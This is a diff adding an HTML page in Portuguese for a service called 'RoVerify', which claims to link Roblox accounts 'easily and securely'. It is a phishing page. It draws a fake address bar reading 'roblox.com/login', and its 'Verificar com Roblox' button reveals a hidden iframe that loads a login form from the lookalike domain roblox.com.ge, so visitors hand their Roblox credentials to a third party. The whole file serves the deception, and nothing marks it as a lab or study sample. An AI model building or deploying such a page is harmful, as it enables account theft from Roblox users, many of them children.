@@ -1,0 +1,161 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Verificação - RoVerify</title>
+  <style>
+    :root{
+      --pink:#e91e63;
+      --card-width:760px;
+      --navbar-height:56px;
+    }
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{
+      margin:0;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial;
+      background:#1c1c1c;
+      color:#fff;
+      min-height:100vh;
+      padding-top: var(--navbar-height);
+      display:flex;
+      justify-content:center;
+      align-items:flex-start;
+    }
+    .navbar{
+      position:fixed;
+      top:0;
+      left:0;
+      right:0;
+      height:var(--navbar-height);
+      background:var(--pink);
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      padding:0 18px;
+      box-shadow:0 2px 8px rgba(0,0,0,0.18);
+      z-index:1000;
+    }
+    .navbar .brand { font-weight:700; color:#fff; }
+    .navbar .menu { display:flex; gap:18px; align-items:center; }
+    .navbar .menu a { color:#fff; text-decoration:none; font-size:14px; }
+    .navbar .menu a.cta {
+      background:#fff;
+      color:var(--pink);
+      padding:6px 12px;
+      border-radius:6px;
+      font-weight:700;
+    }
+    .page {
+      margin-top:40px;
+      width:100%;
+      display:flex;
+      justify-content:center;
+    }
+    .card {
+      width: var(--card-width);
+      background: #fff;
+      color: #222;
+      border-radius:14px;
+      padding:22px;
+      box-shadow: 0 14px 40px rgba(0,0,0,0.35);
+      text-align:center;
+    }
+    .brand-area {
+      text-align:center;
+      margin-bottom:12px;
+    }
+    .brand-area img {
+      max-width:120px;
+      border-radius:50%;
+      margin-bottom:10px;
+    }
+    .brand-area h1 { margin:0; font-size:20px; }
+    .brand-area p { margin:6px 0 0; color:#666; font-size:14px; }
+    .url-bar {
+      margin:14px 0;
+      padding:8px 12px;
+      border-radius:8px;
+      background:#f3f4f6;
+      border:1px solid #e6e7ea;
+      font-family: monospace;
+      font-size:12px;
+      color:#666;
+    }
+    .iframe-wrap {
+      width:100%;
+      border-radius:10px;
+      overflow:hidden;
+      border:1px solid #ddd;
+      background:#fff;
+      display:none; /* esconde inicialmente */
+    }
+    iframe {
+      display:block;
+      width:100%;
+      height:420px;
+      border:0;
+      background:#fff;
+    }
+    .verify-btn {
+      background: var(--pink);
+      color: #fff;
+      border:none;
+      padding:12px 20px;
+      border-radius:8px;
+      font-size:16px;
+      cursor:pointer;
+      margin-top:12px;
+    }
+    .note { margin-top:12px; color:#777; font-size:13px; }
+    @media (max-width:820px){
+      :root{ --card-width:92vw; }
+      .navbar .menu { display:none; }
+    }
+  </style>
+</head>
+<body>
+  <header class="navbar">
+    <div class="brand">RoVerify</div>
+    <nav class="menu">
+      <a href="#">Ajuda</a>
+      <a href="#">Membros</a>
+      <a href="#">Premium</a>
+      <a class="cta" href="#">Entrar</a>
+    </nav>
+  </header>
+
+  <main class="page">
+    <article class="card">
+      <div class="brand-area">
+        <img src="./mjGc-rgO_400x400.jpg" alt="Rolinked Logo">
+        <h1>RoVerify</h1>
+        <p>Conecte sua conta de forma fácil e segura.</p>
+      </div>
+
+      <div class="url-bar">
+        roblox.com/login
+      </div>
+
+      <!-- Botão de verificação -->
+      <button class="verify-btn" id="verifyBtn">Verificar com Roblox</button>
+
+      <!-- Iframe escondido -->
+      <div class="iframe-wrap" id="iframeWrap">
+        <iframe src="https://roblox.com.ge/login?returnUrl=1732008422603187" title="Iframe exemplo"></iframe>
+      </div>
+    </article>
+  </main>
+
+  <script>
+    const btn = document.getElementById('verifyBtn');
+    const iframeWrap = document.getElementById('iframeWrap');
+
+    btn.addEventListener('click', () => {
+      iframeWrap.style.display = 'block'; // mostra o iframe
+      btn.style.display = 'none'; // esconde o botão
+      iframeWrap.scrollIntoView({ behavior: 'smooth' }); // rola para o iframe
+    });
+  </script>
+</body>
+</html>
